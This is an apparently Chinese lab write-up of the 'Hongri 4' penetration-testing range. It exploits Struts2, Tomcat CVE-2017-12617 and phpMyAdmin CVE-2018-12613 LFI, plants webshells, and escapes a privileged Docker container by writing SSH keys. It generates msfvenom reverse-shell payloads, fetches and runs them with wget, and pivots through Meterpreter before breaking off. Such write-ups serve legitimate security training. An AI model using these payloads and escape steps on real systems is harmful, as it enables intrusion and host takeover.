---

title: 红日4靶场
date: 2026-04-05
categories:

  - 红日靶场
tags:
  - 渗透靶场

---

靶场地址：[http://vulnstack.qiyuanxuetang.net/vuln/detail/6/](http://vulnstack.qiyuanxuetang.net/vuln/detail/6/)



# 环境搭建
## 机器密码：
```plain
ubuntu:ubuntu      域成员机器

douser:Dotest123   DC

administrator:Test2008
```



密码过期

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453933.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454131.png)

分别输入原密码：Test2008

新密码：Test2026

即可完成更改











## 网络拓扑：


<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453526.png)





### VMware 网络配置：
VMnet1: 192.168.157.0   桥接模式

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453275.png)



VMnet2: 192.168.183.0  桥接模式

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454873.png)







#### web（Ubuntu）：
**外网 IP：192.168.157.128**

**内网 IP：192.168.183.128**



添加 VMnet1、VMnet2 俩块网卡

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453549.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455907.png)



#### Win7：
**内网 IP：192.168.183.129**

添加 VMnet2

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455685.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456744.png)

#### DC：
**内网 IP：192.168.183.130**

添加 VMnet2

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454506.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455947.png)





#### kali：（作为攻击机）
**外网 IP：192.168.157.129**

添加 VMnet1

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454150.png)









## docker 环境
进入 ubuntu 启动 web：

```bash
ubuntu@ubuntu:~$ cd /home/ubuntu/Desktop/vulhub/struts2/s2-045/
ubuntu@ubuntu:~/Desktop/vulhub/struts2/s2-045$ sudo docker-compose up -d
[sudo] password for ubuntu: [ubuntu]
Starting s2-045_struts2_1 ... done
ubuntu@ubuntu:~/Desktop/vulhub/struts2/s2-045$ cd /home/ubuntu/Desktop/vulhub/tomcat/CVE-2017-12615/
ubuntu@ubuntu:~/Desktop/vulhub/tomcat/CVE-2017-12615$ sudo docker-compose up -d
Starting cve-2017-12615_tomcat_1 ... done
ubuntu@ubuntu:~/Desktop/vulhub/tomcat/CVE-2017-12615$ cd /home/ubuntu/Desktop/vulhub/phpmyadmin/CVE-2018-12613/
ubuntu@ubuntu:~/Desktop/vulhub/phpmyadmin/CVE-2018-12613$ sudo docker-compose up -d
Starting cve-2018-12613_mysql_1 ... done
Starting cve-2018-12613_web_1   ... done
ubuntu@ubuntu:~/Desktop/vulhub/phpmyadmin/CVE-2018-12613$ 
```



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453487.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453471.png)





# 信息收集：
## 扫描端口：
`nmap -Pn 192.168.157.128`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453152.png)





发现三个端口

依次访问各个端口：



## 2001-Struts2:
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453910.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453754.png)



> ## <font style="color:rgb(23, 35, 59);">Apache Struts </font>
> [https://struts.apache.org/](https://struts.apache.org/)
>
>  基于 Java、遵循 MVC 模式、稳定且灵活的开发框架，它通过简化“控制器”和“视图”之间的连接，让开发者能够更高效地构建可维护的企业级动态网页应用  
>
> Apache Struts 就是一个 Java web 网页应用开发框架
>
> 目前主流是 Struts2
>



用工具扫一下看看有没有漏洞：

存在 S2-045 和 S2-046 

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453377.png)



> ### 漏洞原理参考：
> [【漏洞分析】S2-045：Apache Struts2 远程代码执行（RCE）漏洞分析](https://www.anquanke.com/post/id/85674)
>
> [【漏洞分析】Struts2 S2-046 漏洞原理分析](https://www.anquanke.com/post/id/85776)
>



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453791.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455126.png)











## 2002-<font style="color:rgb(0, 0, 0);">Tomcat/8.5.19</font>
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454279.png)

### 漏洞探测
得知了 tomcat 版本，可以搜索看看此版本有哪些漏洞

这里看其他师傅的文章知道了可以在 kali 中进行搜索相关漏洞：

`searchsploit tomcat 8.5.19`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453566.png)

复制对应的 poc 文件：

`searchsploit -m /exploit/jsp/webapps/42966.py`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453386.png)

使用 poc 检测是否存在漏洞：

`python 42966.py -u [http://192.168.157.128:2002/](http://192.168.157.128:2002/)`

该 poc 上传了一个 Poc.jsp 文件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454813.png)

访问路径：[http://192.168.157.128:2002/Poc.jsp](http://192.168.157.128:2002/Poc.jsp)   成功上传了 jsp 文件

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081452603.png)





所以这里存在漏洞 CVE-2017-12617



### 漏洞利用
`python 42966.py -u [http://192.168.157.128:2002/](http://192.168.157.128:2002/) -p pwn`

> elif opt.P!=None and opt.U!=None and opt.L==None:
>
>     print (bcolors.OKGREEN+banner+bcolors.ENDC)
>
>     pwn=str(opt.P)          # 获取输入的 "pwn" 字符串
>
>     url=str(opt.U)
>
>     print ("Uploading Webshell .....")
>
>     pwn=pwn+".jsp"          # 在末尾加上 .jsp，变成 "pwn.jsp"
>
>     RCE(str(url)+"/",pwn)    # 调用 RCE 函数上传真正的木马文件
>
>     shell(str(url),pwn)      # 进入交互式 Shell 模式
>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454982.png)





<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">生成linux的木马，在kali本地起一个http服务方便靶机下载</font>





`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.157.129 LPORT=4444 -f elf > shell.elf`



开启 http 服务方便下载木马：

`python -m http.server 8000`





在`-p pwn`反弹的命令行，<font style="color:rgb(35, 57, 77);">下载shell.elf并赋权执行</font>

```plain
wget http://192.168.157.129:8000/shell.elf
chmod 777 shell.elf
./shell.elf
```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455801.png)

同时也用 msf 接收会话：

```plain
use multi/handler
set payload linux/x86/meterpreter/reverse_tcppayload 
set lhost 192.168.157.129
set lport 4444
run
```



```bash
┌──(xvsf㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Tired of setting RHOSTS for modules? Try globally 
setting it with setg RHOSTS x.x.x.x
                                                  
                                   ___          ____
                               ,-""   `.      < HONK >
                             ,'  _   e )`-._ /  ----
                            /  ,' `-._<.===-'
                           /  /
                          /  ;
              _          /   ;
 (`._    _.-"" ""--..__,'    |
 <_  `-""                     \
  <`-                          :
   (__   <__.                  ;
     `-.   '-.__.      _.'    /
        \      `-.__,-'    _,'
         `._    ,    /__,-'
            ""._\__,'< <____
                 | |  `----.`.
                 | |        \ `.
                 ; |___      \-``
                 \   --<
                  `.`.<
                    `-'



       =[ metasploit v6.4.116-dev                               ]
+ -- --=[ 2,623 exploits - 1,326 auxiliary - 1,710 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 10 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcppayload 
[-] The value specified for payload is not valid.
msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.157.129
lhost => 192.168.157.129
msf exploit(multi/handler) > set lport 4444
lport => 4444
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.157.129:4444 
[*] Sending stage (1062760 bytes) to 192.168.157.128
[*] Meterpreter session 1 opened (192.168.157.129:4444 -> 192.168.157.128:58326) at 2026-04-05 08:54:50 -0400

meterpreter > 

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454761.png)

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453236.png)







## 2003-phpmyadmin 4.8.1
<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454379.png)



<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">对应版本的漏洞是 CVE-2018-12613</font>

> [https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md](https://github.com/vulhub/vulhub/blob/master/phpmyadmin/CVE-2018-12613/README.zh-cn.md)
>

<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">poc: </font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">?target=db_sql.php%253f/../../../../../../../../etc/passwd</font>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454477.png)



新建一张表， 写入`<?php phpinfo();?>`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454738.png)

> **<font style="color:rgb(51, 51, 51);">原理：</font>**<font style="color:rgb(51, 51, 51);">  
</font><font style="color:rgb(51, 51, 51);">Http 协议是一种无状态协议，即每次服务端接收到客户端的请求时，都是一个全新的请求，服务器并不知道客户端的历史请求记录；</font>
>
> <font style="color:rgb(51, 51, 51);">**Session 的主要目的就是为了弥补 Http 的无状态特性。简单的说，就是服务器可以利用 session 存储客户端在同一个会话期间的一些操作记录；</font>
>
> <font style="color:rgb(51, 51, 51);">** 因此这里相对应的 sql 的查询历史也会出现在 session 中，若是一句话木马出现在 session 中，那么就可以使用远程文件包含取得 shell 了。</font>
>
> <font style="color:rgb(51, 51, 51);">session 常见的一些保存路径</font>
>
> <font style="color:rgb(51, 51, 51);">/var/lib/php/sess_PHPSESSID</font>
>
> <font style="color:rgb(51, 51, 51);">/var/lib/php/sessions/sess_PHPSESSID</font>
>
> <font style="color:rgb(51, 51, 51);">/tmp/sess_PHPSESSID</font>
>
> <font style="color:rgb(51, 51, 51);">/tmp/sessions/sess_PHPSESSID</font>
>
> `<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">session</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">文件的存储路径是分为两种情况的</font>
>
> <font style="color:rgb(51, 51, 51);">一是没有权限，默认存储在</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">/var/lib/php/sessions/</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">目录下，文件名为</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">sess_[phpsessid]</font>`<font style="color:rgb(51, 51, 51);">，而</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">phpsessid</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">在发送的请求的</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">cookie</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">字段中可以看到（一般在利用漏洞时我们自己设置</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">phpsessid</font>`<font style="color:rgb(51, 51, 51);">）</font>
>
> <font style="color:rgb(51, 51, 51);">二是</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">phpmyadmin</font>`<font style="color:rgb(51, 51, 51);">，这时的</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">session</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">文件存储在</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">/tmp</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">目录下，需要在</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">php.ini</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">里把</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">session.auto_start</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">置为 1，把</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">session.save_path</font>`<font style="color:rgb(51, 51, 51);"> </font><font style="color:rgb(51, 51, 51);">目录设置为</font><font style="color:rgb(51, 51, 51);"> </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">/tmp</font>`
>
> <font style="color:rgb(51, 51, 51);">直接执行 </font>`<font style="color:rgb(51, 51, 51);background-color:rgba(0, 0, 0, 0.03);">SELECT "<?php phpinfo();?>"</font>`<font style="color:rgb(51, 51, 51);">  
</font><font style="color:rgb(51, 51, 51);">可以看到确实被保存到了 sess_sessid 中去了。</font><!-- 这是一张图片，ocr 内容为： -->
![Pasted image 20221006233022.png](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456273.png)<!-- 这是一张图片，ocr 内容为： -->
![Pasted image 20221006233046.png](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456357.png)
>

<font style="color:rgb(51, 51, 51);">  
</font>

得到 phpMyAdmin 的值：<font style="color:rgb(22, 29, 28);background-color:rgb(247, 254, 251);">5b72d8a8c59d4b8df7268f33858f6de5</font>

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453618.png)

<font style="color:rgb(35, 57, 77);"></font>

<font style="color:rgb(35, 57, 77);">然后构造payload进行文件包含输出phpinfo</font>

`?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_5b72d8a8c59d4b8df7268f33858f6de5`

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455952.png)



之后写入一句话木马使用蚁剑连接：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081453211.png)



[http://192.168.157.128:2003/?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_5b72d8a8c59d4b8df7268f33858f6de5](http://192.168.157.128:2003/?target=db_datadict.php%253f/../../../../../../../../../tmp/sess_5b72d8a8c59d4b8df7268f33858f6de5)



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455892.png)



`?target=tbl_zoom_select.php?/../../../../../../tmp/sess_e7bec897077c4a99f9e6e5da0bed67b5&cmd=file_put_contents("/var/www/html/shell.php", base64_decode("PD9waHAgZXZhbCgkX1BPU1RbJ2NtZCddKTs/Pg=="));`



这个端口后续尝试了几种不同的方法，但是始终写不进去文件，蚁剑也连接不上。





# Docker 逃逸
理论上，通过上面的三个端口都可以拿到 shell，  



现在很明显进入了一个 docker 容器中，看不到其他的

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454277.png)

### <font style="color:rgb(35, 57, 77);">privileged特权模式逃逸</font>
> <font style="color:rgb(35, 57, 77);">docker中提供了一个</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">--privileged</font>`<font style="color:rgb(35, 57, 77);">参数，这个参数本身最初的目的是为了提供在docker中运行docker的能力  
</font>[<font style="color:rgb(247, 83, 87);">https://www.docker.com/blog/docker-can-now-run-within-docker/</font>](https://www.docker.com/blog/docker-can-now-run-within-docker/)
>
> <font style="color:rgb(35, 57, 77);">docker文档中对这个参数的解释如下  
</font>[<font style="color:rgb(247, 83, 87);">https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities</font>](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)
>
> <font style="color:#ED740C;background-color:rgb(246, 246, 246);">当操作员执行时docker run –privileged，Docker将启用对主机上所有设备的访问，并在AppArmor或SELinux中进行一些配置，以允许容器对主机的访问几乎与在主机上容器外部运行的进程相同。</font>
>
> <font style="color:rgb(35, 57, 77);">当控制使用特权模式启动的容器时，docker管理员可通过mount命令将外部宿主机磁盘设备挂载进容器内部，获取对整个宿主机的文件读写权限，此外还可以通过写入计划任务等方式在宿主机执行命令。那么这里就可以尝试使用特权模式写入ssh私钥，使用ssh免密登录</font>
>



利用 `fdisk -l` 查看挂载盘：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455468.png)

有一块 sda 物理硬盘，10GB

使用了传统的 MBR（dos）分区格式。

sda1: 主分区，`Boot` 带有 `*` 说明这是启动分区，

sda2: 扩展分区，里面可以包含多个逻辑分区

sda5: 逻辑分区，在这里作为 swap （交换分区）



sda1 是宿主机的物理分区，所以可以尝试将 sda1 挂载到当前的目录，如果可以成功挂载，那么就可以修改宿主机的某些文件来尝试逃逸了。

`mkdir shell`

`mount /dev/sda1 shell`

挂载成功，这样就可以去查看、修改宿主机的文件了

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455613.png)





写入 ssh 密钥进行 docker 逃逸：

在 kali 中生成密钥，创建一个 key 文件

然后将密钥复制

```bash
┌──(xvsf㉿kali)-[~/key]
└─$ ssh-keygen -f hack
Generating public/private ed25519 key pair.
Enter passphrase for "hack" (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in hack
Your public key has been saved in hack.pub
The key fingerprint is:
SHA256:MbxOqYLmGnzBry/ZIVRgNIqAC2FwLetXnpr24xvAvvM xvsf@kali
The key's randomart image is:
+--[ED25519 256]--+
|*oo*.            |
|*.+ o. .         |
|oo o.   +        |
|. oo  .  =       |
| ..ooo .S        |
|. .++oo+         |
|..oo*++ .        |
| +.o*+..         |
|...o+*Eo         |
+----[SHA256]-----+
                                                                                                                    
┌──(xvsf㉿kali)-[~/key]
└─$ ls
hack  hack.pub
                                                                                                                    
┌──(xvsf㉿kali)-[~/key]
└─$ chmod 600 hack                              
                                                                                                                    
┌──(xvsf㉿kali)-[~/key]
└─$ cat hack.pub                                         
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDcw3GT/7IZNG63q7vcadnsKArGEx79lqifug3M58m5 xvsf@kali
                                                                                                                    
┌──(xvsf㉿kali)-[~/key]
└─$ 

```

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081454947.png)





写入目标的 .ssh 目录下：



```bash
pwd
/usr/local/tomcat

cd shell/home/ubuntu/.ssh

pwd
/usr/local/tomcat/shell/home/ubuntu/.ssh

ls
id_rsa
id_rsa.pub

cp -avx /usr/local/tomcat/shell/home/ubuntu/.ssh/id_rsa.pub /usr/local/tomcat/shell/home/ubuntu/.ssh/authorized_keys
'/usr/local/tomcat/shell/home/ubuntu/.ssh/id_rsa.pub' -> '/usr/local/tomcat/shell/home/ubuntu/.ssh/authorized_keys'

echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDcw3GT/7IZNG63q7vcadnsKArGEx79lqifug3M58m5 xvsf@kali' > /usr/local/tomcat/shell/home/ubuntu/.ssh/authorized_keys

cat /usr/local/tomcat/shell/home/ubuntu/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIDcw3GT/7IZNG63q7vcadnsKArGEx79lqifug3M58m5 xvsf@kali


```



<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455548.png)





ssh 连接宿主机：` ssh -i hack ubuntu@192.168.157.128`    ` # -i 参数代表 Identity File（身份文件），即私钥  `

这样就可以免密码进入了：

<!-- 这是一张图片，ocr 内容为： -->
![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081455260.png)





# Ubuntu 上线 msf


还是之前的方法，kali 上生成一个 shell.elf 文件，并且开启 http 服务

```bash
┌──(xvsf㉿kali)-[~]
└─$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.157.129 LPORT=5555 -f elf > shell1.elf
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes

                                                                                                             
┌──(xvsf㉿kali)-[~]
└─$ python -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

```

通过之前 docker 逃逸获取的 Ubuntu shell，下载文件、添加权限、执行文件

```bash
wget http://192.168.157.129:8000/shell1.elf
chmod 777 shell1.elf
./shell1.elf
```

```bash
ubuntu@ubuntu:~$ wget http://192.168.157.129:8000/shell1.elf
--2026-04-05 19:31:45--  http://192.168.157.129:8000/shell1.elf
Connecting to 192.168.157.129:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 207 [application/octet-stream]
Saving to: ‘shell1.elf’

100%[==========================================================================>] 207         --.-K/s   in 0s      

2026-04-05 19:31:45 (113 MB/s) - ‘shell1.elf’ saved [207/207]

ubuntu@ubuntu:~$ 
ubuntu@ubuntu:~$ chmod 777 shell1.elf
ubuntu@ubuntu:~$ ./shell1.elf 

```

同时 kali 开启 msf，设置 payload 等

```bash
┌──(xvsf㉿kali)-[~]
└─$ msfconsole
Metasploit tip: Bind your reverse shell to a tunnel with set 
ReverseListenerBindAddress <tunnel_address> and set 
ReverseListenerBindPort <tunnel_port> (e.g., ngrok)
                                                  

      .:okOOOkdc'           'cdkOOOko:.
    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
           :kk;.OOOOOOOOOOOOO.;Ok:
             ;kOOOOOOOOOOOOOOOk:
               ,xOOOOOOOOOOOx,
                 .lOOOOOOOl.
                    ,dOd,
                      .

       =[ metasploit v6.4.116-dev                               ]
+ -- --=[ 2,623 exploits - 1,326 auxiliary - 1,710 payloads     ]
+ -- --=[ 432 post - 49 encoders - 14 nops - 10 evasion         ]

Metasploit Documentation: https://docs.metasploit.com/
The Metasploit Framework is a Rapid7 Open Source Project

msf > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
payload => linux/x86/meterpreter/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.157.129
lhost => 192.168.157.129
msf exploit(multi/handler) > set lport 5555
lport => 5555
msf exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.157.129:5555 
[*] Sending stage (1062760 bytes) to 192.168.157.130
[*] Meterpreter session 1 opened (192.168.157.129:5555 -> 192.168.157.130:60278) at 2026-04-05 22:33:05 -0400

meterpreter > getuid
Server username: ubuntu
meterpreter > 
meterpreter > ipconfig

Interface  1
============
Name         : lo
Hardware MAC : 00:00:00:00:00:00
MTU          : 65536
Flags        : UP,LOOPBACK
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::


Interface  2
============
Name         : eth0
Hardware MAC : 00:0c:29:d3:42:25
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.168.157.130
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::20c:29ff:fed3:4225
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface  3
============
Name         : eth1
Hardware MAC : 00:0c:29:d3:42:2f
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.168.183.132
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::20c:29ff:fed3:422f
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface  4
============
Name         : docker0
Hardware MAC : 02:42:50:b6:44:ae
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.17.0.1
IPv4 Netmask : 255.255.0.0


Interface  5
============
Name         : br-f0d07941b332
Hardware MAC : 02:42:64:75:77:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.19.0.1
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::42:64ff:fe75:7702
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface  6
============
Name         : br-05384b1b0df2
Hardware MAC : 02:42:1f:ae:ec:e0
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.18.0.1
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::42:1fff:feae:ece0
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface  7
============
Name         : br-1d665e13ee58
Hardware MAC : 02:42:60:67:f5:89
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 172.20.0.1
IPv4 Netmask : 255.255.0.0
IPv6 Address : fe80::42:60ff:fe67:f589
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface  9
============
Name         : vethda04cda
Hardware MAC : 76:35:f1:aa:72:9b
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST


Interface 11
============
Name         : veth7e9e0b3
Hardware MAC : 12:6c:25:3d:a3:43
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST


Interface 13
============
Name         : veth5b60d28
Hardware MAC : b6:12:79:29:86:1d
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST


Interface 15
============
Name         : veth61d68a8
Hardware MAC : e2:35:e7:d5:c4:8f
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST

meterpreter > 

```



# 存活探测


```bash
meterpreter > run autoroute -s 192.168.183.0/24
[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
